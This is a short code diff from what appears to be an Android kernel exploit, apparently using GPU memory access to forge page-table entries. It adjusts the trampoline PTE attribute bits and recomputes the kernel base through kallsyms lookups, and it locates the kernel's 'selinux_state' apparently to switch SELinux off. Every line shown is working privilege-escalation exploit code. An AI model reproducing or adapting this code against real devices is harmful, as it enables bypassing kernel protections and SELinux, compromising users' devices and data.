@@ -383,7 +383,7 @@ int cheese_gpu_rw_setup(struct cheese_gpu_rw* cheese) {
     // pxn=1 << 53 ??
     // uxn=1 << 54
     // nonSecure = 1 << 55
-    // we want MT_NORMAL on 5.10, which has AttrIndx index 0 (Checked: 5.10 (in qemu) kernel is mapped with 0x004400004020078)
+    // we want MT_NORMAL on 5.10, which has AttrIndx index 0 (Checked: 5.10 (in qemu) kernel is mapped with 0x0044000040200781)
     // so need to change AttrIndx to 0: 0xe8000000000741
     uint64_t tramp_pte_value = tramp_pte_target | 0xe8000000000741;
     //uint64_t tramp_pte_value = 0x41414141;
@@ -689,7 +689,7 @@ int main() {
     const bool force_manual_patchfinder = false;
 
     // TODO(zhuowei): this is dumped from vmlinux-to-elf/kallsyms-finder on my computer and is specific to 51052260106700520 - need to auto detect this
-    uint64_t kernel_virtual_base = kallsyms_lookup.kallsyms_relative_base;
+    uint64_t kernel_virtual_base = cheese_kallsyms_lookup(&kallsyms_lookup, "efi_header_end") - 0x10000;
     uint64_t kernel_selinux_state_addr = cheese_kallsyms_lookup(&kallsyms_lookup, "selinux_state");
     if (force_manual_patchfinder || !kernel_selinux_state_addr) {
         kernel_selinux_state_addr = cheese_lookup_selinux_state(&kallsyms_lookup);
